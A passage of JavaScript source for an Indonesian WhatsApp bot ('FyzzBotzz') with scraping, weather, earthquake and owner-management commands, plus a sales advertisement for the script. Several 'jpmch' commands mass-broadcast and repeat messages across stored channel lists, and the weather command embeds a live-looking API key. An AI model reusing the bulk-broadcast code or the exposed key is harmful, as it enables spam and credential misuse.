 P: '🅟', Q: '🅠', R: '🅡', S: '🅢', T: '🅣',
 U: '🅤', V: '🅥', W: '🅦', X: '🅧', Y: '🅨', Z: '🅩'
 };
 return text.split('').map(char => base[char] || char).join('');
 }

 let reaction = convertToStyledFont(args.slice(1).join(' '));
 await conn.newsletterReactMessage(res.id, serverId, reaction);
 Reply(`Berhasil mengirim reaction "${reaction}" ke dalam channel ${res.name}`);
}
break;

//=========================================//

case "wallpaper": {
  if (!text) return m.reply(`📌 *Contoh:* ${prefix + command} kamado tanjiro`);

  await m.reply('🔍 Sedang mencari wallpaper...');

  const axios = require('axios');
  const cheerio = require('cheerio');
  const { generateWAMessageContent, generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: conn.waUploadToServer
    });
    return imageMessage;
  }

  async function UhdpaperSearch(query) {
    try {
      const response = await axios.get(`https://www.uhdpaper.com/search?q=${query}&by-date=true&i=0`);
      const html = response.data;
      const $ = cheerio.load(html);
      const results = [];

      $('article.post-outer-container').each((_, element) => {
        const title = $(element).find('.snippet-title h2').text().trim();
        const imageUrl = $(element).find('.snippet-title img').attr('src');
        const resolution = $(element).find('.wp_box b').text().trim();
        const link = $(element).find('a').attr('href');

        if (title && imageUrl && resolution && link) {
          results.push({ title, imageUrl, resolution, link });
        }
      });

      return results;
    } catch (error) {
      console.error('Error scraping UHDPaper:', error.message);
      return [];
    }
  }

  let hasil = await UhdpaperSearch(text);
  if (!hasil.length) return m.reply('❌ Wallpaper tidak ditemukan.');

  let i = 1;
  const carousel = [];

  for (let item of hasil.slice(0, 5)) {
    carousel.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `🖼️ Resolusi: ${item.resolution}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: '乂 U H D P A P E R'
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: `Wallpaper: ${text}`,
        hasMediaAttachment: true,
        imageMessage: await createImage(item.imageUrl)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "🌐 Download Wallpaper",
              url: item.link,
              merchant_url: item.link
            })
          }
        ]
      })
    });
    i++;
  }

  const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `🖼️ Berikut hasil pencarian untuk: *${text}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: '乂 UHDPaper Wallpaper Search'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: carousel
          })
        })
      }
    }
  }, { quoted: m });

  await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
  break;
}

//=========================================//

case "berita": {
  if(!text) return m.reply('Masukan URL');
  m.reply('Mohon Tunggu');

const axios = require('axios');
const cheerio = require('cheerio');

async function BeritaDetikDetail(url) {
  try {
  const { data } = await axios.get(url);
  const $ = cheerio.load(data);

  const title = $('h1').first().text().trim();
  const author = $('.detail__author').text().trim() || $('div.author').text().trim();
  const date = $('.detail__date').text().trim() || $('div.date').text().trim();
  const image = $('.detail__media img').attr('src') || $('article img').first().attr('src');
  let description = $('article p').first().text().trim();
  if (!description) {
    description = $('meta[name="description"]').attr('content') || '';
  }

  return { title, author, date, image, description };
    } catch (error) {
    console.error('Error:', error);
    return null;
  }
}

let result = await BeritaDetikDetail(text);
if(!result) return m.reply('Gagal Memproses Anunya...');

let teks = '';
teks+= '*' + result.title + '*\n\n'
teks+= '- Author:' + result.author + '\n'
teks+= '- Date:' + result.date + '\n'
teks+= '\n'
teks+= '- Description:`' + result.description + '`\n'

conn.sendMessage(m.chat, {
  image: { url: result.image },
  caption: teks
}, { quoted: m })
}
break;

//=========================================//

case "infogempa": {
    if (!isCreator) return Reply(mess.owner)
    m.reply("Sedang mengambil data gempa terkini...");
    
    try {
        const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
        const data = await response.json();
        
        if (!data || !data.Infogempa || !data.Infogempa.gempa) {
            return m.reply("Gagal mendapatkan data gempa dari BMKG.");
        }
        
        const gempa = data.Infogempa.gempa;
        
        let caption = `*📈 INFO GEMPA TERKINI*\n\n`;
        caption += `*Tanggal:* ${gempa.Tanggal}\n`;
        caption += `*Waktu:* ${gempa.Jam}\n`;
        caption += `*Magnitudo:* ${gempa.Magnitude}\n`;
        caption += `*Kedalaman:* ${gempa.Kedalaman}\n`;
        caption += `*Lokasi:* ${gempa.Wilayah}\n`;
        caption += `*Koordinat:* ${gempa.Lintang} ${gempa.Bujur}\n`;
        caption += `*Potensi:* ${gempa.Potensi}\n`;
        caption += `*Dirasakan:* ${gempa.Dirasakan}\n\n`;
        caption += `Sumber: BMKG (https://www.bmkg.go.id/)`;
        
        if (gempa.Shakemap) {
            const shakemapUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`;
            await conn.sendMessage(m.chat, {
                image: { url: shakemapUrl },
                caption: caption
            }, { quoted: m });
        } else {
            conn.sendMessage(m.chat, { text: caption }, { quoted: m });
        }
    } catch (error) {
        console.log(error);
        m.reply("Terjadi kesalahan saat mengambil data gempa.");
    }
}
break

//=========================================//

case "infocuaca": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply ('*Silakan berikan lokasi yang ingin dicek cuacanya!*')

    try {
        let wdata = await axios.get(
            `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&lang=id`
        );

        let textw = ""
        textw += `*🗺️ Cuaca di ${text}*\n\n`
        textw += `*🌤️ Cuaca:* ${wdata.data.weather[0].main}\n`
        textw += `*📖 Deskripsi:* ${wdata.data.weather[0].description}\n`
        textw += `*🌡️ Suhu Rata-rata:* ${wdata.data.main.temp}°C\n`
        textw += `*🤒 Terasa Seperti:* ${wdata.data.main.feels_like}°C\n`
        textw += `*🌬️ Tekanan Udara:* ${wdata.data.main.pressure} hPa\n`
        textw += `*💧 Kelembaban:* ${wdata.data.main.humidity}%\n`
        textw += `*🌪️ Kecepatan Angin:* ${wdata.data.wind.speed} m/s\n`
        textw += `*📍 Latitude:* ${wdata.data.coord.lat}\n`
        textw += `*📍 Longitude:* ${wdata.data.coord.lon}\n`
        textw += `*🌍 Negara:* ${wdata.data.sys.country}\n`

        conn.sendMessage(
            m.chat, {
                text: textw,
            }, {
                quoted: qtext2,
            }
        )
    } catch (error) {
        Reply('*Terjadi kesalahan! Pastikan lokasi yang Anda masukkan benar.*')
    }
}
break

//=========================================//
// 𝗡𝗘𝗪 𝗖𝗔𝗦𝗘 𝗝𝗣𝗠𝗖𝗛 𝗦𝗖𝗥𝗜𝗣𝗧 𝗙𝗬𝗭𝗭𝗕𝗢𝗧𝗭𝗭
//=========================================//
case "jpmchteks": {
 if (!isCreator && !isJasher) return Reply(mess.owner);
 const fs = require('fs');
 const setting = JSON.parse(fs.readFileSync('./library/database/setbot.json', 'utf8'));
 if (!setting.botJpmch) return Reply("❌ Fitur JPMCH sedang nonaktif.");

 if (!text) return Reply("Teksnya?");
 let daftarSaluran;
 try {
   daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));
 } catch (e) {
   console.error(e);
   return Reply("❌ Gagal baca file idsaluran.json");
 }

 Reply("⏳ Kirim teks sedang diproses...");

 for (const id of daftarSaluran) {
   try {
     await conn.sendMessage(id, { text });
     await sleep(setting.delayJpm || 5000);
   } catch (err) {
     console.error(`❌ Gagal kirim ke ${id}:`, err);
   }
 }
 Reply("✅ Teks berhasil dikirim ke semua saluran.");
}
break;

//=============================================//

case "jpmchvip": {
 if (!isCreator && !isJasherVIP) return Reply(mess.owner);
 const fs = require('fs');
 const setting = JSON.parse(fs.readFileSync('./library/database/setbot.json', 'utf8'));
 if (!setting.botJpmch) return Reply("❌ Fitur JPMCH sedang nonaktif.");

 if (!text) return Reply("Teksnya?");
 let daftarSaluran;
 try {
   daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));
 } catch (e) {
   console.error(e);
   return Reply("❌ Gagal baca file idsaluran.json");
 }

 Reply("⏳ Kirim teks sedang diproses...");

 for (const id of daftarSaluran) {
   try {
     await conn.sendMessage(id, { text });
     await sleep(setting.delayJpm || 5000);
   } catch (err) {
     console.error(`❌ Gagal kirim ke ${id}:`, err);
   }
 }
 Reply("✅ Teks berhasil dikirim ke semua saluran.");
}
break;

//=============================================//

case "jpmchfoto": {
 if (!isCreator) return m.reply(mess.owner);

 const fs = require('fs');
 const settingPath = './library/database/setbot.json';
 const setting = fs.existsSync(settingPath)
 ? JSON.parse(fs.readFileSync(settingPath))
 : { botJpmch: false, delayJpm: 5000 };

 if (!setting.botJpmch) return m.reply("❌ Fitur JPMCH sedang nonaktif.");

 if (!text) return m.reply("Balas/kirim foto dengan teks");
 if (!/image/.test(mime)) return m.reply("Format salah! Balas/kirim foto dengan teks.");

 let image = await conn.downloadAndSaveMediaMessage(qmsg);
 const daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json'));

 let total = 0;
 m.reply(`Memproses Mengirim Foto ke ${daftarSaluran.length} Saluran...`);

 for (const idSaluran of daftarSaluran) {
 try {
 await conn.sendMessage(idSaluran, {
 image: fs.readFileSync(image),
 caption: text,
 contextInfo: {
 forwardingScore: 1,
 isForwarded: true,
 },
 });
 total++;
 } catch (err) {
 console.error(`❌ Gagal mengirim ke saluran ${idSaluran}:`, err);
 }
 await sleep(setting.delayJpm || 5000); // gunakan delay dari setbot.json
 }

 fs.unlinkSync(image);
 m.reply(`✅ Berhasil mengirim ke ${total} saluran.`);
}
break

//=============================================//

case "jpmchvideo": {
  if (!isCreator) return m.reply(mess.owner);

  const fs = require('fs');
  const settingPath = './library/database/setbot.json';
  const setting = fs.existsSync(settingPath)
    ? JSON.parse(fs.readFileSync(settingPath))
    : { botJpmch: false, delayJpm: 5000 };

  if (!setting.botJpmch) return m.reply("❌ Fitur JPMCH sedang nonaktif.");

  if (!text) return m.reply("Balas/kirim video dengan teks");
  if (!/video/.test(mime)) return m.reply("Format salah! Balas/kirim video dengan teks.");

  let video = await conn.downloadAndSaveMediaMessage(qmsg);
  const daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json'));

  let total = 0;
  m.reply(`Memproses Mengirim Video ke ${daftarSaluran.length} Saluran...`);

  for (const idSaluran of daftarSaluran) {
    try {
      await conn.sendMessage(idSaluran, {
        video: fs.readFileSync(video),
        caption: text,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
        },
      });
      total++;
    } catch (err) {
      console.error(`❌ Gagal mengirim ke saluran ${idSaluran}:`, err);
    }
    await sleep(setting.delayJpm || 5000);
  }

  fs.unlinkSync(video);
  m.reply(`✅ Berhasil mengirim ke ${total} saluran.`);
}
break

//=============================================//

case "jpmchjumlah": {
  if (!isCreator) return m.reply(mess.owner);

  let [jumlah, ...pesanArray] = text.split('|');
  let pesan = pesanArray.join('|').trim();
  jumlah = parseInt(jumlah.trim());

  if (isNaN(jumlah) || jumlah <= 0) return m.reply("❌ Masukkan jumlah pesan yang valid di awal teks! Contoh: 3| Halo semua!");

  // Memuat setting dari file setbot.json
  const fs = require('fs');
  const settingPath = './library/database/setbot.json';
  const setting = fs.existsSync(settingPath)
    ? JSON.parse(fs.readFileSync(settingPath))
    : { botJpmch: false, delayJpm: 5000 };

  if (!setting.botJpmch) return m.reply("❌ Fitur JPMCH sedang nonaktif.");
  
  // Memuat daftar saluran dari file JSON
  let daftarSaluran;
  try {
    daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));
    if (!Array.isArray(daftarSaluran) || daftarSaluran.length === 0) {
      return m.reply("❌ Tidak ada saluran yang terdaftar.");
    }
  } catch (error) {
    console.error("Gagal membaca file idsaluran.json:", error);
    return m.reply("❌ Gagal membaca daftar saluran.");
  }

  // Kirim pesan ke semua saluran dalam daftar sesuai jumlah yang ditentukan
  for (const idSaluran of daftarSaluran) {
    for (let i = 0; i < jumlah; i++) {
      try {
        await conn.sendMessage(idSaluran, { text: pesan });
      } catch (error) {
        console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error);
      }
      await sleep(setting.delayJpm || 5000); // Delay sesuai setting dari setbot.json
    }
  }

  m.reply(`✅ Berhasil mengirim pesan ke semua channel sebanyak ${jumlah} kali.`);
}
break;

//=============================================//

case "jpmchbutton": {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply("Teksnya?");

  const fs = require('fs');

  // Ambil setting dari setbot.json
  const settingPath = './library/database/setbot.json';
  const setting = fs.existsSync(settingPath)
    ? JSON.parse(fs.readFileSync(settingPath))
    : { botJpmch: false, delayJpm: 5000 };

  if (!setting.botJpmch) return Reply("❌ Fitur JPMCH sedang nonaktif.");

  // Baca daftar saluran
  let daftarSaluran;
  try {
    daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));
    if (!Array.isArray(daftarSaluran) || daftarSaluran.length === 0) {
      return Reply("❌ Tidak ada saluran yang terdaftar.");
    }
  } catch (error) {
    console.error("Gagal membaca idsaluran.json:", error);
    return Reply("❌ Gagal membaca daftar saluran.");
  }

  // Baca URL channel
  let urlChannel = {};
  try {
    urlChannel = JSON.parse(fs.readFileSync('./library/database/urlchannel.json', 'utf8'));
  } catch (error) {
    console.error("Gagal membaca urlchannel.json:", error);
    urlChannel = {
      satu: "https://whatsapp.com/channel/DEFAULT_SATU",
      dua: "https://whatsapp.com/channel/DEFAULT_DUA"
    };
  }

  Reply("⏳ Harap sabar, proses sedang berlangsung. Jeda antar kiriman sesuai pengaturan...");

  for (const idSaluran of daftarSaluran) {
    try {
      await conn.sendMessage(idSaluran, {
        text: text,
        footer: 'SEMUA CHANNEL KAMI!',
        templateButtons: [
          { index: 1, urlButton: { displayText: 'CHANNEL 1', url: urlChannel.satu } },
          { index: 2, urlButton: { displayText: 'CHANNEL 2', url: urlChannel.dua } }
        ]
      }, { quoted: m });
    } catch (error) {
      console.error(`❌ Gagal mengirim ke saluran ${idSaluran}:`, error);
    }

    // Tunggu jeda antar kiriman sesuai setbot.json
    await sleep(setting.delayJpm || 5000);
  }

  Reply("✅ Berhasil mengirim pesan ke semua channel WhatsApp dengan 2 button link.");
}
break;

case "seturlsatu": {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply("❌ Masukkan URL channel satu baru!");

  const fs = require('fs');
  try {
    let data = {};
    try {
      data = JSON.parse(fs.readFileSync('./library/database/urlchannel.json', 'utf8'));
    } catch {}
    data.satu = text;
    fs.writeFileSync('./library/database/urlchannel.json', JSON.stringify(data, null, 2));
    Reply("✅ URL channel satu berhasil diperbarui!");
  } catch (e) {
    console.error("Gagal update URL satu:", e);
    Reply("❌ Gagal memperbarui URL channel satu.");
  }
}
break;

case "seturldua": {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply("❌ Masukkan URL channel dua baru!");

  const fs = require('fs');
  try {
    let data = {};
    try {
      data = JSON.parse(fs.readFileSync('./library/database/urlchannel.json', 'utf8'));
    } catch {}
    data.dua = text;
    fs.writeFileSync('./library/database/urlchannel.json', JSON.stringify(data, null, 2));
    Reply("✅ URL channel dua berhasil diperbarui!");
  } catch (e) {
    console.error("Gagal update URL dua:", e);
    Reply("❌ Gagal memperbarui URL channel dua.");
  }
}
break;

//=============================================//

case "setbotjpmch": {
  if (!isCreator) return Reply(mess.owner);
  const fs = require('fs');
  const path = './library/database/setbot.json';
  let config = fs.existsSync(path) ? JSON.parse(fs.readFileSync(path)) : {};
  
  if (/on/i.test(text)) {
    config.botJpmch = true;
    fs.writeFileSync(path, JSON.stringify(config, null, 2));
    return Reply("✅ Fitur JPMCH berhasil *diaktifkan*.");
  } else if (/off/i.test(text)) {
    config.botJpmch = false;
    fs.writeFileSync(path, JSON.stringify(config, null, 2));
    return Reply("✅ Fitur JPMCH berhasil *dinonaktifkan*.");
  } else {
    return Reply(`⚙️ Contoh penggunaan:\n.setbotjpmch on\n.setbotjpmch off`);
  }
}
break;

//=============================================//

case "setdelayjpmch": {
 if (!isCreator) return Reply(mess.owner);
 if (!text || isNaN(text)) return Reply("Contoh: .setdelayjpm 5000");

 const fs = require('fs');
 const path = './library/database/setbot.json';
 let config = fs.existsSync(path) ? JSON.parse(fs.readFileSync(path)) : {};
 config.delayJpm = parseInt(text);
 fs.writeFileSync(path, JSON.stringify(config, null, 2));
 Reply(`✅ Delay antar channel diset ke ${text} ms.`);
}
break;

//=================== Tambah Jasher ====================
case "addownjs": {
  if (!isCreator) return Reply(mess.owner);
  if (!text && !m.quoted) return Reply(`Kirim nomor atau reply orang\nContoh: .addownjs 628xxx`);
  const target = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (jasherDB.owners.includes(target)) return Reply("✅ Sudah jadi Own Jasher.");
  jasherDB.owners.push(target);
  fs.writeFileSync(jasherPath, JSON.stringify(jasherDB, null, 2));
  Reply("✅ Berhasil menambahkan ke Own Jasher.");
}
break;

//=================== Hapus Jasher ====================
case "delownjs": {
  if (!isCreator) return Reply(mess.owner);
  if (!text && !m.quoted) return Reply(`Kirim nomor atau reply orang\nContoh: .delownjs 628xxx`);
  const target = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!jasherDB.owners.includes(target)) return Reply("❌ Bukan Own Jasher.");
  jasherDB.owners = jasherDB.owners.filter(x => x !== target);
  fs.writeFileSync(jasherPath, JSON.stringify(jasherDB, null, 2));
  Reply("✅ Berhasil menghapus dari Own Jasher.");
}
break;

//=================== Tambah Jasher VIP ====================
case "addptjs": {
  if (!isCreator) return Reply(mess.owner);
  if (!text && !m.quoted) return Reply(`Kirim nomor atau reply orang\nContoh: .addptjs 628xxx`);
  const target = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (jasherVIPDB.owners.includes(target)) return Reply("✅ Sudah jadi Pt Jasher.");
  jasherVIPDB.owners.push(target);
  fs.writeFileSync(jasherVIPPath, JSON.stringify(jasherVIPDB, null, 2));
  Reply("✅ Berhasil menambahkan ke Pt Jasher.");
}
break;

//=================== Hapus Jasher VIP ====================
case "delptjs": {
  if (!isCreator) return Reply(mess.owner);
  if (!text && !m.quoted) return Reply(`Kirim nomor atau reply orang\nContoh: .delptjs 628xxx`);
  const target = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!jasherVIPDB.owners.includes(target)) return Reply("❌ Bukan Pt Jasher.");
  jasherVIPDB.owners = jasherVIPDB.owners.filter(x => x !== target);
  fs.writeFileSync(jasherVIPPath, JSON.stringify(jasherVIPDB, null, 2));
  Reply("✅ Berhasil menghapus dari Pt Jasher.");
}
break;

//=================== List Jasher ====================
case "listownjs": {
  if (!isCreator) return Reply(mess.owner);
  const list = jasherDB.owners.map((x, i) => `${i + 1}. @${x.replace(/[^0-9]/g, '')}`).join("\n") || "Belum Ada Own Jasher.";
  conn.sendMessage(m.chat, {
    text: `📛 *Daftar Own Jasher:*\n\n${list}`,
    mentions: jasherDB.owners
  }, { quoted: m });
}
break;

//=================== List Jasher VIP ====================
case "listptjs": {
  if (!isCreator) return Reply(mess.owner);
  const list = jasherVIPDB.owners.map((x, i) => `${i + 1}. @${x.replace(/[^0-9]/g, '')}`).join("\n") || "Belum ada PT JASHER.";
  conn.sendMessage(m.chat, {
    text: `👑 *Daftar Pt Jasher:*\n\n${list}`,
    mentions: jasherVIPDB.owners
  }, { quoted: m });
}
break;

//=============================================//

case "sc": {
  if (!m.isGroup) return m.reply('Khusus dalam grup!')

  const teks = `NEW UPDATE SC FyzzBotzz V4.2 📦

*INFO SCRIPT :*
* DELPANEL ( BUTTON )
* ADDAKSES ( BUTTON )
* SUPPORT ALL WA
* NO ENC PASTINYA
* INSTAL PANEL MENU
* DIGITAL OCEAN MENU
* CPANEL MENU
* STORE MENU
* ISLAM MENU
* NEW MENU
* COCOK UNTUK YANG OPEN RESELLER PANEL
*  STORE+PUSHKONTAK
* PUSHKONTAK AUTOSAVE
* AMAN NO BACKDOOR
* SC SIMPLE COCOK UNTUK STORE
* JPMCHFOTO
* JPMCHVIPP
* JPMCHTEKSBUTTON
* ADDIDCH
𝗛𝗔𝗥𝗚𝗔 𝗡𝗢 𝗘𝗡𝗖 : Rp. 15.000 ( PROMO ) 

*BENEFIT?*
- FREE PANEL UNLI 
- NO ENC BEBAS UBAH
- FREE EGG 21

📩 *Contact Admin*
* +6285180532568
* +6281313532320
* +62 85835692106 ( Kenon ) 
* t.me/FixzzCok (Fast Respon) 

*[ TESTIMONI ]*
https://whatsapp.com/channel/0029VbBFQNb17En3MAIHaU3R`

  const participants = m.isGroup ? await conn.groupMetadata(m.chat).then(res => res.participants.map(v => v.id)) : []

  conn.sendMessage(m.chat, {
    text: teks,
    mentions: participants,
    contextInfo: {
      mentionedJid: participants,
      externalAdReply: {
        title: "FyzzBotzz V4.2",
        body: "Chat Penjual via WhatsApp (Grup)",
        thumbnailUrl: "https://img1.pixhost.to/images/8902/643492781_fixzzxcpanel.jpg",
        sourceUrl: global.linkGroup || "https://chat.whatsapp.com/BsTzFkNxrJ51MK5aIRsZg7",
        mediaType: 1,
        renderLargerThumbnail: true,
        showAdAttribution: true
      }
    }
  }, { quoted: m })
}
break

//=============================================//

case "backup": case "ambilsc": case "backupsc": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return m.reply(mess.owner)
if (!isCreator) return m.reply(mess.owner);
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
let name = `Script FyzzBotzz ${global.versi}`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await conn.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//=============================================//

case "addidch": {
  if (!isCreator) return m.reply(mess.owner);

  try {
    // Pastikan command diketik di channel
    if (!m.chat.endsWith("@newsletter")) {
      return m.reply("❌ Perintah ini hanya bisa digunakan di dalam channel.");
    }

    let id = m.chat;

    // Baca file JSON
    let daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));

    // Cek apakah ID sudah ada
    if (daftarSaluran.includes(id)) {
      return m.reply('❌ ID saluran sudah ada dalam daftar.');
    }

    // Tambahkan ID baru
    daftarSaluran.push(id);

    // Simpan kembali ke file JSON
    fs.writeFileSync('./library/database/idsaluran.json', JSON.stringify(daftarSaluran, null, 2));
    m.reply(`✅ ID saluran berhasil ditambahkan:\n${id}`);
  } catch (error) {
    console.error("Error saat menambahkan ID:", error);
    m.reply('❌ Terjadi kesalahan saat menambahkan ID.');
  }
}
break;


case "addallid": {
 if (!isCreator) return m.reply(mess.owner);
 if (!text) return m.reply('❌ Masukkan satu atau lebih ID saluran yang ingin ditambahkan (pisahkan dengan spasi atau koma) *Contoh ( .addallid id1, id2*.');

 try {
 // Baca file JSON
 let daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));

 // Pisahkan input menjadi array (bisa dipisahkan dengan spasi atau koma)
 let idBaru = text.split(/[\s,]+/).filter(id => id.trim() !== "");

 // Filter ID yang belum ada dalam daftar
 let idBerhasilDitambahkan = [];
 let idSudahAda = [];

 idBaru.forEach(id => {
 if (daftarSaluran.includes(id)) {
 idSudahAda.push(id);
 } else {
 daftarSaluran.push(id);
 idBerhasilDitambahkan.push(id);
 }
 });

 // Simpan kembali ke file JSON jika ada ID baru yang ditambahkan
 if (idBerhasilDitambahkan.length > 0) {
 fs.writeFileSync('./library/database/idsaluran.json', JSON.stringify(daftarSaluran, null, 2));
 }

 // Kirim respons
 let pesan = '✅ Hasil Penambahan ID:\n';
 if (idBerhasilDitambahkan.length > 0) {
 pesan += `- ID baru ditambahkan: ${idBerhasilDitambahkan.join(', ')}\n`;
 }
 if (idSudahAda.length > 0) {
 pesan += `- ID sudah ada dalam daftar: ${idSudahAda.join(', ')}`;
 }
 
 m.reply(pesan.trim());
 } catch (error) {
 console.error("Error saat menambahkan ID:", error);
 m.reply('❌ Terjadi kesalahan saat menambahkan ID.');
 }
 break;
}
//=============================================//

case "gconly": {
 if (!isCreator) return m.reply(mess.owner)

 if (args[0] === 'on') {
 global.gconly = true
 m.reply('✅ Mode *Group Only* telah diaktifkan. Bot hanya akan merespon chat dari grup.')
 } else if (args[0] === 'off') {
 global.gconly = false
 m.reply('❌ Mode *Group Only* dimatikan. Bot kembali merespon semua chat.')
 } else {
 m.reply(`Gunakan:\n- *.gconly on* untuk mengaktifkan\n- *.gconly off* untuk menonaktifkan`)
 }
}
break

//=============================================//

case "autoblock":
  if (!isCreator) return m.reply('❌ Hanya Owner yang bisa mengatur autoblock!');
  if (!args[0]) return m.reply('❗ Contoh penggunaan: *.autoblock on* atau *.autoblock off*');

  autoblockData.enabled = args[0].toLowerCase() === 'on';
  fs.writeFileSync('./library/database/autoblock.json', JSON.stringify(autoblockData, null, 2));

  return m.reply(`✅ Auto-block PM sekarang *${autoblockData.enabled ? 'AKTIF' : 'NONAKTIF'}*`);
  
//=============================================//
  
case "autojpmch": {
  if (!isCreator) return Reply(mess.owner);
  const fs = require('fs');
  const path = './library/database/autojpmch_status.json';

  let data = { status: false };
  if (fs.existsSync(path)) {
    data = JSON.parse(fs.readFileSync(path));
  }

  if (!args[0]) {
    return Reply(`📢 Status saat ini: *${data.status ? "ON ✅" : "OFF ❌"}*\nGunakan:\n.autojpmch on\n.autojpmch off`);
  }

  const cmd = args[0].toLowerCase();
  if (cmd === 'on') {
    data.status = true;
    fs.writeFileSync(path, JSON.stringify(data, null, 2));
    return Reply("✅ AutoJPMCH *diaktifkan*.");
  } else if (cmd === 'off') {
    data.status = false;
    fs.writeFileSync(path, JSON.stringify(data, null, 2));
    return Reply("❌ AutoJPMCH *dimatikan*.");
  } else {
    return Reply("⚠️ Format salah. Gunakan:\n.autojpmch on\n.autojpmch off");
  }
}

case "addteks": {
  if (!isCreator) return Reply(mess.owner);
  const fs = require('fs');
  const path = './library/database/autojpmch_text.json';
  if (!text) return Reply("❌ Masukkan teks yang ingin ditambahkan.");

  let data = { texts: [] };
  if (fs.existsSync(path)) {
    data = JSON.parse(fs.readFileSync(path));
  }

  data.texts.push(text);
  fs.writeFileSync(path, JSON.stringify(data, null, 2));
  return Reply("✅ Teks berhasil ditambahkan.");
}

case "delteks": {
  if (!isCreator) return Reply(mess.owner);
  const fs = require('fs');
  const path = './library/database/autojpmch_text.json';
  if (!text) return Reply("❌ Masukkan nomor atau isi teks untuk dihapus.");

  let data = { texts: [] };
  if (fs.existsSync(path)) {
    data = JSON.parse(fs.readFileSync(path));
  }

  let removed = false;
  if (!isNaN(text)) {
    const index = parseInt(text) - 1;
    if (data.texts[index]) {
      data.texts.splice(index, 1);
      removed = true;
    }
  } else {
    const index = data.texts.findIndex(t => t.toLowerCase().includes(text.toLowerCase()));
    if (index !== -1) {
      data.texts.splice(index, 1);
      removed = true;
    }
  }

  if (removed) {
    fs.writeFileSync(path, JSON.stringify(data, null, 2));
    return Reply("🗑️ Teks berhasil dihapus.");
  } else {
    return Reply("❌ Teks tidak ditemukan.");
  }
}

case "listteks": {
  if (!isCreator) return Reply(mess.owner);
  const fs = require('fs');
  const path = './library/database/autojpmch_text.json';
  let data = { texts: [] };
  if (fs.existsSync(path)) {
    data = JSON.parse(fs.readFileSync(path));
  }

  const list = data.texts.map((t, i) => `*${i + 1}.* ${t}`).join('\n') || '_Belum ada teks_';
  return Reply(`📄 *Daftar Teks AutoJPMCH:*\n\n${list}`);
}

case "cekstatusjpmch": {
  if (!isCreator) return Reply(mess.owner);
  const fs = require('fs');
  const path = './library/database/autojpmch_status.json';

  let data = { status: false };
  if (fs.existsSync(path)) {
    data = JSON.parse(fs.readFileSync(path));
  }

  return Reply(`📊 Status AutoJPMCH saat ini: *${data.status ? "ON ✅" : "OFF ❌"}*`);
}
//=========================================//

case "listonline": case "liston": {
				if (!m.isGroup) return Reply(mess.group);
				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
				let online = [...Object.keys(store.presences[id]), botNumber]
				await conn.sendMessage(m.chat, { text: 'List Online:\n\n' + online.map(v => `@` + v.replace(/@.+/, '')).join`\n`, mentions: online }, { quoted: m }).catch((e) => Reply('*Data tidak ditemukan! ☹️*'))
			}
			break;

//=========================================//

case "addownerall": {
 if (!isCreator) return Reply(mess.owner)
 if (!m.isGroup) return Reply(mess.group)

 const metadata = await conn.groupMetadata(m.chat)
 let added = 0

 for (let participant of metadata.participants) {
 if (
 participant.id === botNumber || 
 owners.includes(participant.id) || 
 participant.id === global.owner
 ) continue

 owners.push(participant.id)
 added++
 }

